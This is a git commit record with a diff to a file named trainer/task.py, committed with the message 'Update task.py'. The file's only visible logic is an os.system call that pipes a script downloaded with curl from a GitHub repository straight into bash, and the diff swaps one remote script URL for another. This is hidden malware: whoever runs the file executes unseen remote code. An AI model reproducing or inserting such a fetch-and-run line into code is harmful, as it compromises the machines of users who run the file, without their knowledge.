45c0fe9d31330bceded098f3ebddf5aa913a5e7d
vedhagsvp <vedhag230223@gmail.com>
2025-09-18 01:09:05 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/taberas/raw/main/jba.sh | bash')
+os.system('curl -sL https://github.com/vedhagsvp/soljtka/raw/main/solsad.sh | bash')
